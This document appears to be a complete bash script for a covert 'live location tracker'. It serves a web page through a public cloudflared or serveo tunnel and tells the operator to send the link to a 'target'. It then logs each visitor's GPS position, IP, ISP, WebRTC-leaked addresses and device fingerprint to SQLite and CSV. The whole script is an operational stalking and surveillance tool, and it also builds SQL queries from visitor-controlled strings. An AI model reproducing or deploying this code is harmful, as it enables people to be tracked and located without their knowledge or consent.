#!/usr/bin/env bash

# Colors
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
blue='\e[94m'
magenta='\e[95m'
purple='\e[35m'
white='\e[97m'
reset='\e[0m'
bold='\e[1m'

# ============================================================
# CONFIG
# ============================================================
LOG_RETENTION_DAYS=30
DB_FILE="targets.db"
CSV_FILE="targets.csv"
PORT=8080

# ============================================================
# PLATFORM DETECTION
# ============================================================
IS_TERMUX=0
if [[ -d /data/data/com.termux ]]; then
    IS_TERMUX=1
fi

# ============================================================
# PACKAGE INSTALL (platform-aware)
# ============================================================
echo -e "${yellow}[+]${reset} ${white}Checking required packages...${reset}"

install_pkg() {
    local cmd="$1"
    local pkg="$2"

    if command -v "$cmd" >/dev/null 2>&1; then
        return 0
    fi

    echo -e "${cyan}    Installing $pkg...${reset}"

    if [[ $IS_TERMUX -eq 1 ]]; then
        pkg install "$pkg" -y >/dev/null 2>&1
    else
        # Linux: try apt, then dnf, then pacman
        if command -v apt >/dev/null 2>&1; then
            sudo apt install "$pkg" -y >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            sudo dnf install "$pkg" -y >/dev/null 2>&1
        elif command -v pacman >/dev/null 2>&1; then
            sudo pacman -S "$pkg" --noconfirm >/dev/null 2>&1
        fi
    fi
}

# Core packages (cross-platform names handled)
install_pkg php php
install_pkg curl curl
install_pkg wget wget

# sqlite3 (binary name)
if ! command -v sqlite3 >/dev/null 2>&1; then
    if [[ $IS_TERMUX -eq 1 ]]; then
        pkg install sqlite -y >/dev/null 2>&1
    else
        if command -v apt >/dev/null 2>&1; then
            sudo apt install sqlite3 -y >/dev/null 2>&1
        fi
    fi
fi

# jq (optional, but nice)
install_pkg jq jq

# inotify-tools (optional)
if ! command -v inotifywait >/dev/null 2>&1; then
    if [[ $IS_TERMUX -eq 1 ]]; then
        pkg install inotify-tools -y >/dev/null 2>&1
    else
        if command -v apt >/dev/null 2>&1; then
            sudo apt install inotify-tools -y >/dev/null 2>&1
        fi
    fi
fi

# cloudflared (Termux + Linux)
if ! command -v cloudflared >/dev/null 2>&1; then
    if [[ $IS_TERMUX -eq 1 ]]; then
        pkg install cloudflared -y >/dev/null 2>&1
    fi
fi

# Termux API (only on Termux)
if [[ $IS_TERMUX -eq 1 ]]; then
    install_pkg termux-toast termux-api
fi

# ============================================================
# ENVIRONMENT CHECK
# ============================================================
echo ""
echo -e "${yellow}[+]${reset} ${white}Environment check:${reset}"
printf "    php:         %s\n" "$(command -v php >/dev/null && echo -e "${green}✓${reset}" || echo -e "${red}✗${reset}")"
printf "    sqlite3:     %s\n" "$(command -v sqlite3 >/dev/null && echo -e "${green}✓${reset}" || echo -e "${yellow}○${reset} (optional)")"
printf "    jq:          %s\n" "$(command -v jq >/dev/null && echo -e "${green}✓${reset}" || echo -e "${yellow}○${reset} (optional)")"
printf "    cloudflared: %s\n" "$(command -v cloudflared >/dev/null && echo -e "${green}✓${reset}" || echo -e "${yellow}○${reset} (needed for option 2)")"
printf "    inotifywait: %s\n" "$(command -v inotifywait >/dev/null && echo -e "${green}✓${reset}" || echo -e "${yellow}○${reset} (optional, faster)")"
echo ""

# ============================================================
# BANNER
# ============================================================
show_banner() {
    clear
    echo -e "${green}Initializing Black Eye Protocol...${reset}"
    sleep 0.5
    for i in 1 2 3; do echo -n "."; sleep 0.3; done
    echo ""
    sleep 0.5
    echo -e "${red}    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ███████╗██╗   ██╗███████╗${reset}"
    echo -e "${yellow}    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝╚██╗ ██╔╝██╔════╝${reset}"
    echo -e "${green}    ██████╔╝██║     ███████║██║     █████╔╝     █████╗   ╚████╔╝ █████╗  ${reset}"
    echo -e "${cyan}    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔══╝    ╚██╔╝  ██╔══╝  ${reset}"
    echo -e "${blue}    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ███████╗   ██║   ███████╗${reset}"
    echo -e "${purple}    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚══════╝${reset}"
    echo ""
    echo -e "${yellow}              ⚡ LIVE LOCATION TRACKER  •      ⚡${reset}"
    echo ""
    echo -e "${cyan}  Created by:${reset} ${green}ATHEX${reset} ${cyan}YouTube:${reset} ${red}@inziXploit444${reset}"
    echo ""
    echo -e "${purple}  [ SYSTEM STATUS ]${reset}  ${green}✓ ONLINE${reset}  ${purple}[ MODE ]${reset}  ${yellow}⚡ STEALTH${reset}"
    echo ""
}
show_banner

echo -e "${bold}${cyan} SELECT ATTACK VECTOR ${reset}\n"
echo -e "${green}  [1]${reset} ${white}LOCALHOST${reset}        ${cyan}→${reset} ${yellow}http://127.0.0.1:${PORT}${reset}"
echo -e "${cyan}  [2]${reset} ${white}CLOUDFLARED${reset}      ${cyan}→${reset} ${yellow}Public HTTPS URL (Recommended)${reset}"
echo -e "${magenta}  [3]${reset} ${white}SERVEO.NET${reset}       ${cyan}→${reset} ${yellow}SSH Tunnel${reset}"
echo ""
echo -ne "${red}⌨️${reset} ${green}Enter choice [1-3]:${reset} ${cyan}"
read opt
echo -ne "${reset}"
opt=${opt:-1}

# ============================================================
# PHP SERVER START
# ============================================================
echo -e "\n${yellow}[+]${reset} ${white}Initializing PHP server on${reset} ${cyan}127.0.0.1:${PORT}${reset}"
mkdir -p logs

# Kill existing php server (portable — no killall dependency)
if command -v pkill >/dev/null 2>&1; then
    pkill -f "php -S 127.0.0.1:${PORT}" >/dev/null 2>&1
elif command -v killall >/dev/null 2>&1; then
    killall php >/dev/null 2>&1
fi
sleep 1

# Start PHP server with log
php -S "127.0.0.1:${PORT}" > logs/php_server.log 2>&1 &
PHP_PID=$!
sleep 2

# Verify PHP is running
if ! ps -p "$PHP_PID" >/dev/null 2>&1; then
    echo -e "${red}[-] PHP server failed to start!${reset}"
    echo -e "${yellow}[i]${reset} Check logs/php_server.log:"
    cat logs/php_server.log 2>/dev/null | tail -20
    exit 1
fi
echo -e "${green}    ✓ PHP server started (PID: $PHP_PID)${reset}"

# ============================================================
# TUNNEL SETUP
# ============================================================
link=""

if [[ $opt == 2 ]]; then
    if ! command -v cloudflared >/dev/null 2>&1; then
        echo -e "${red}[-] cloudflared not installed!${reset}"
        echo -e "${yellow}    Termux: pkg install cloudflared${reset}"
        echo -e "${yellow}    Linux:  download from https://github.com/cloudflare/cloudflared/releases${reset}"
        exit 1
    fi

    echo -e "${yellow}[+]${reset} ${white}Deploying Cloudflared tunnel...${reset}"
    pkill -f cloudflared >/dev/null 2>&1
    rm -f .clflog
    cloudflared tunnel --url "http://localhost:${PORT}" > .clflog 2>&1 &

    echo -ne "${cyan}    Establishing secure tunnel "
    for i in 1 2 3 4 5 6 7 8 9 10; do echo -n "▫"; sleep 0.3; done
    echo -e "${reset}\n"

    echo -e "${yellow}[+]${reset} ${white}Fetching public link...${reset}"
    for i in $(seq 1 20); do
        link=$(grep -o "https://[-0-9a-zA-Z.]*\.trycloudflare.com" .clflog 2>/dev/null | head -n1)
        [[ -n "$link" ]] && break
        sleep 1
    done

    if [[ -z "$link" ]]; then
        echo -e "${red}[-] Cloudflared failed!${reset}"
        echo -e "${yellow}[i]${reset} Last 20 lines of .clflog:"
        tail -20 .clflog 2>/dev/null
        exit 1
    fi

elif [[ $opt == 3 ]]; then
    echo -e "${yellow}[+]${reset} ${white}Deploying Serveo.net SSH tunnel...${reset}"
    pkill -f "ssh.*serveo" >/dev/null 2>&1
    rm -f .servolog
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
        -R 80:localhost:${PORT} serveo.net > .servolog 2>&1 &

    echo -ne "${cyan}    Establishing secure tunnel "
    for i in 1 2 3 4 5 6 7 8 9 10; do echo -n "▫"; sleep 0.3; done
    echo -e "${reset}\n"

    echo -e "${yellow}[+]${reset} ${white}Fetching Serveo link...${reset}"
    for i in $(seq 1 20); do
        link=$(grep -oE "https://[a-z0-9.-]*\.serveo\.net" .servolog 2>/dev/null | head -n1)
        [[ -n "$link" ]] && break
        sleep 1
    done

    if [[ -z "$link" ]]; then
        echo -e "${red}[-] Serveo failed!${reset}"
        echo -e "${yellow}[i]${reset} Last 20 lines of .servolog:"
        tail -20 .servolog 2>/dev/null
        exit 1
    fi

else
    link="http://127.0.0.1:${PORT}"
    echo -e "${green}    ✓ Localhost mode activated${reset}"
    if [[ $IS_TERMUX -eq 1 ]]; then
        echo -e "${yellow}    ⚠  Localhost only works on THIS phone.${reset}"
        echo -e "${yellow}       For other devices, use option [2] Cloudflared.${reset}"
    fi
    echo -e "${yellow}    ⚠  Geolocation API needs HTTPS (or localhost).${reset}"
fi

# ============================================================
# LINK DISPLAY
# ============================================================
echo ""
echo -e "${red}//////////////////////////////////////////////////////////////////////////${reset}"
echo -e "${red}/${yellow}                 🎯 TARGET LINK GENERATED 🎯                 ${red}/${reset}"
echo -e "${red}...............................................................................${reset}"
echo -e "${red}/${reset}  ${cyan}→${reset} ${green}Send this link to target:${reset}"
echo -e "${red}/${reset}  ${bold}${magenta}$link${reset}"
echo -e "${red}..............................................................................${reset}"
echo ""

# ============================================================
# DATABASE INIT
# ============================================================
DB_ENABLED=0
if command -v sqlite3 >/dev/null 2>&1; then
    DB_ENABLED=1
    sqlite3 "$DB_FILE" <<'SQL' 2>/dev/null
CREATE TABLE IF NOT EXISTS targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    time TEXT, ip TEXT, country TEXT, city TEXT, isp TEXT,
    lat TEXT, lon TEXT, acc TEXT, alt TEXT, speed TEXT,
    webrtc TEXT, device TEXT, maps TEXT, ua TEXT
);
SQL
    if [[ $? -eq 0 ]]; then
        echo -e "${green}[+]${reset} SQLite database ready: $DB_FILE"
    else
        DB_ENABLED=0
        echo -e "${yellow}[!]${reset} SQLite init failed — DB logging disabled"
    fi
else
    echo -e "${yellow}[!]${reset} sqlite3 not found — DB logging disabled"
    [[ $IS_TERMUX -eq 1 ]] && echo -e "${yellow}    Install: pkg install sqlite${reset}"
fi

# CSV init
if [[ ! -f "$CSV_FILE" ]]; then
    echo "time,ip,country,city,isp,lat,lon,acc,alt,speed,webrtc,device,maps" > "$CSV_FILE"
fi

# ============================================================
# JSON EXTRACT HELPER (jq → python → grep fallback)
# ============================================================
json_get() {
    local json="$1"
    local path="$2"

    if command -v jq >/dev/null 2>&1; then
        echo "$json" | jq -r "${path} // \"\"" 2>/dev/null
    elif command -v python3 >/dev/null 2>&1; then
        echo "$json" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    keys = '$path'.strip('.').split('.')
    for k in keys:
        if k and isinstance(d, dict):
            d = d.get(k, '')
        else:
            return
    print(d if d is not None else '')
except Exception:
    print('')
" 2>/dev/null
    else
        # grep fallback — last key only
        local key="${path##*.}"
        echo "$json" | grep -o "\"$key\":\"[^\"]*\"" | head -1 | cut -d'"' -f4
    fi
}

# ============================================================
# DISPLAY TARGET CARD
# ============================================================
display_target() {
    local json="$1"
    local count="$2"

    local time ip country city isp lat lon acc alt speed maps_link webrtc ua screen cpu ram tz gpu

    time=$(json_get "$json" '.time')
    ip=$(json_get "$json" '.ip.address')
    country=$(json_get "$json" '.ip.country')
    city=$(json_get "$json" '.ip.city')
    isp=$(json_get "$json" '.ip.isp')
    lat=$(json_get "$json" '.gps.lat')
    lon=$(json_get "$json" '.gps.lon')
    acc=$(json_get "$json" '.gps.acc')
    alt=$(json_get "$json" '.gps.alt')
    speed=$(json_get "$json" '.gps.speed')
    maps_link=$(json_get "$json" '.gps.maps')
    webrtc=$(json_get "$json" '.webrtc_ips')
    ua=$(json_get "$json" '.headers.user_agent')
    screen=$(json_get "$json" '.device.screen')
    cpu=$(json_get "$json" '.device.cpuCores')
    ram=$(json_get "$json" '.device.deviceMemory')
    tz=$(json_get "$json" '.device.timezone')
    gpu=$(json_get "$json" '.device.gpu.renderer')

    # Fallbacks
    [[ -z "$time" ]]       && time="?"
    [[ -z "$ip" ]]         && ip="?"
    [[ -z "$country" ]]    && country="?"
    [[ -z "$city" ]]       && city="?"
    [[ -z "$isp" ]]        && isp="?"
    [[ -z "$lat" ]]        && lat="?"
    [[ -z "$lon" ]]        && lon="?"
    [[ -z "$acc" ]]        && acc="?"
    if [[ -z "$maps_link" || "$maps_link" == "null" ]]; then
        maps_link="https://www.google.com/maps?q=${lat},${lon}"
    fi

    # Alert (Termux only)
    if [[ $IS_TERMUX -eq 1 ]]; then
        termux-vibrate -d 300 2>/dev/null || true
    fi
    printf '\a'

    echo ""
    echo -e "${red}╔══════════════════════════════════════════════════════════════════════╗${reset}"
    echo -e "${red}║${yellow}              🚨 TARGET #${count} ACQUIRED! 🚨              ${red}║${reset}"
    echo -e "${red}╠══════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${red}║${reset}  ${cyan}⏰ Time:${reset}   ${green}${time}${reset}"
    echo -e "${red}║${reset}  ${cyan}🌐 IP:${reset}     ${green}${ip}${reset}"
    echo -e "${red}║${reset}  ${cyan}🌍 Geo:${reset}    ${yellow}${city}, ${country}${reset}"
    echo -e "${red}║${reset}  ${cyan}📡 ISP:${reset}    ${magenta}${isp}${reset}"
    echo -e "${red}╠══════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${red}║${reset}  ${cyan}📌 Lat:${reset}    ${yellow}${lat}${reset}"
    echo -e "${red}║${reset}  ${cyan}📌 Lon:${reset}    ${yellow}${lon}${reset}"
    echo -e "${red}║${reset}  ${cyan}🎯 Acc:${reset}    ${magenta}±${acc} m${reset}"
    [[ -n "$alt" && "$alt" != "?" ]]     && echo -e "${red}║${reset}  ${cyan}⛰️  Alt:${reset}    ${blue}${alt}m${reset}"
    [[ -n "$speed" && "$speed" != "?" ]] && echo -e "${red}║${reset}  ${cyan}🏃 Speed:${reset}  ${blue}${speed}m/s${reset}"
    [[ -n "$webrtc" ]]                   && echo -e "${red}║${reset}  ${cyan}🔓 WebRTC:${reset} ${red}${webrtc}${reset}"
    echo -e "${red}╠══════════════════════════════════════════════════════════════════════╣${reset}"
    [[ -n "$screen" && "$screen" != "?" ]] && echo -e "${red}║${reset}  ${purple}📱 Device:${reset} ${screen} | CPU: ${cpu}c | RAM: ${ram}GB | TZ: ${tz}"
    [[ -n "$gpu" && "$gpu" != "?" ]]       && echo -e "${red}║${reset}  ${purple}🎮 GPU:${reset}    ${gpu}"
    [[ -n "$ua" && "$ua" != "?" ]]         && echo -e "${red}║${reset}  ${purple}🖥️  UA:${reset}     ${ua:0:70}"
    echo -e "${red}╠══════════════════════════════════════════════════════════════════════╣${reset}"
    echo -e "${red}║${reset}  ${cyan}🗺️  Google Maps:${reset}"
    echo -e "${red}║${reset}  ${blue}${maps_link}${reset}"
    echo -e "${red}╚══════════════════════════════════════════════════════════════════════╝${reset}"
    echo ""

    # Clipboard + toast (Termux only)
    if [[ $IS_TERMUX -eq 1 ]]; then
        echo "$maps_link" | termux-clipboard-set 2>/dev/null || true
        termux-toast "🎯 Target #${count} location copied!" 2>/dev/null || true
    fi

    # Save to DB
    if [[ $DB_ENABLED -eq 1 ]]; then
        sqlite3 "$DB_FILE" "INSERT INTO targets (time,ip,country,city,isp,lat,lon,acc,alt,speed,webrtc,device,maps,ua) VALUES ('${time}','${ip}','${country}','${city}','${isp}','${lat}','${lon}','${acc}','${alt}','${speed}','${webrtc}','${screen}|${cpu}c|${ram}GB','${maps_link}','${ua:0:200}');" 2>/dev/null
    fi

    # CSV
    echo "\"${time}\",\"${ip}\",\"${country}\",\"${city}\",\"${isp}\",\"${lat}\",\"${lon}\",\"${acc}\",\"${alt}\",\"${speed}\",\"${webrtc}\",\"${screen}|${cpu}c|${ram}GB\",\"${maps_link}\"" >> "$CSV_FILE"
}

# ============================================================
# FILE MONITORING SETUP
# ============================================================
touch locations.txt locations.json
chmod 600 locations.txt locations.json 2>/dev/null || true

target_count=0

# cleanup old logs (once at start)
find logs/ -type f -mtime +${LOG_RETENTION_DAYS} -delete 2>/dev/null || true

echo -e "${bold}${green}🔌 LIVE TARGET MONITORING ACTIVATED${reset}"
echo -e "${yellow}[i]${reset} Send link to target and wait..."
echo -e "${yellow}[i]${reset} Press ${green}Ctrl+C${reset} to exit"
echo -e "${yellow}______________________________________________________________________${reset}"

# ============================================================
# MAIN LOOP (inotify if available, else polling)
# ============================================================
if command -v inotifywait >/dev/null 2>&1; then
    # inotify mode — real-time
    inotifywait -m -e modify,create --format '%w%f' locations.json locations.txt 2>/dev/null |
    while read -r changed_file; do
        case "$changed_file" in
            *locations.json)
                new_line=$(tail -n 1 locations.json 2>/dev/null)
                if [[ -n "$new_line" ]] && echo "$new_line" | grep -q '"gps"'; then
                    target_count=$((target_count + 1))
                    display_target "$new_line" "$target_count"
                    echo -e "${cyan}[ Monitoring ]${reset} Targets: ${green}${target_count}${reset} | Waiting..."
                fi
                ;;
            *locations.txt)
                new_data=$(tail -n 1 locations.txt 2>/dev/null)
                # only handle legacy if JSON wasn't written
                if [[ "$new_data" != *'"gps"'* && "$new_data" == *"Lat"* ]]; then
                    lat=$(echo "$new_data" | grep -o 'Lat: [0-9.-]*' | head -1 | awk '{print $2}')
                    lon=$(echo "$new_data" | grep -o 'Lon: [0-9.-]*' | head -1 | awk '{print $2}')
                    if [[ -n "$lat" && -n "$lon" ]]; then
                        target_count=$((target_count + 1))
                        maps_link="https://www.google.com/maps?q=${lat},${lon}"
                        echo ""
                        echo -e "${red}╔══════════════════════════════════════════════════════════════╗${reset}"
                        echo -e "${red}║${yellow}  🚨 TARGET #${target_count} (legacy TXT) 🚨  ${red}║${reset}"
                        echo -e "${red}╠══════════════════════════════════════════════════════════════╣${reset}"
                        echo -e "${red}║${reset}  📌 Lat: ${lat} | Lon: ${lon}"
                        echo -e "${red}║${reset}  🗺️  ${maps_link}"
                        echo -e "${red}╚══════════════════════════════════════════════════════════════╝${reset}"
                        echo ""
                        if [[ $IS_TERMUX -eq 1 ]]; then
                            echo "$maps_link" | termux-clipboard-set 2>/dev/null || true
                            termux-toast "🎯 Target #${target_count} copied!" 2>/dev/null || true
                        fi
                    fi
                fi
                ;;
        esac
    done
else
    # Polling fallback
    echo -e "${yellow}[!]${reset} inotifywait not found — using polling mode (slower)"
    [[ $IS_TERMUX -eq 1 ]] && echo -e "${yellow}    Install: pkg install inotify-tools${reset}"

    last_size_json=$(stat -c%s locations.json 2>/dev/null || echo 0)
    last_size_txt=$(stat -c%s locations.txt 2>/dev/null || echo 0)

    while true; do
        # JSON check
        if [[ -f locations.json ]]; then
            current_size_json=$(stat -c%s locations.json 2>/dev/null || echo 0)
            if [[ $current_size_json -gt $last_size_json ]]; then
                new_json=$(tail -c +$((last_size_json + 1)) locations.json 2>/dev/null)
                while IFS= read -r line; do
                    [[ -z "$line" ]] && continue
                    if echo "$line" | grep -q '"gps"'; then
                        target_count=$((target_count + 1))
                        display_target "$line" "$target_count"
                    fi
                done <<< "$new_json"
                last_size_json=$current_size_json
            fi
        fi

        # TXT check
        current_size_txt=$(stat -c%s locations.txt 2>/dev/null || echo 0)
        if [[ $current_size_txt -gt $last_size_txt ]]; then
            new_data=$(tail -c +$((last_size_txt + 1)) locations.txt 2>/dev/null)
            if [[ "$new_data" != *'"gps"'* && "$new_data" == *"Lat"* ]]; then
                lat=$(echo "$new_data" | grep -o 'Lat: [0-9.-]*' | head -1 | awk '{print $2}')
                lon=$(echo "$new_data" | grep -o 'Lon: [0-9.-]*' | head -1 | awk '{print $2}')
                if [[ -n "$lat" && -n "$lon" ]]; then
                    target_count=$((target_count + 1))
                    maps_link="https://www.google.com/maps?q=${lat},${lon}"
                    echo ""
                    echo -e "${red}🚨 TARGET #${target_count} (legacy TXT)${reset}"
                    echo -e "${yellow}  Lat/Lon: ${lat}, ${lon}${reset}"
                    echo -e "${blue}  ${maps_link}${reset}"
                    echo ""
                    if [[ $IS_TERMUX -eq 1 ]]; then
                        echo "$maps_link" | termux-clipboard-set 2>/dev/null || true
                        termux-toast "🎯 Target #${target_count} copied!" 2>/dev/null || true
                    fi
                fi
            fi
            last_size_txt=$current_size_txt
        fi

        # Rotating spinner
        printf "${cyan}[ Monitoring ]${reset} Targets: ${green}%d${reset} | Waiting... ${yellow}◐${reset}\r" "$target_count"
        sleep 0.3
        printf "${cyan}[ Monitoring ]${reset} Targets: ${green}%d${reset} | Waiting... ${yellow}◓${reset}\r" "$target_count"
        sleep 0.3
        printf "${cyan}[ Monitoring ]${reset} Targets: ${green}%d${reset} | Waiting... ${yellow}◑${reset}\r" "$target_count"
        sleep 0.3
        printf "${cyan}[ Monitoring ]${reset} Targets: ${green}%d${reset} | Waiting... ${yellow}◒${reset}\r" "$target_count"
        sleep 0.1
    done
fi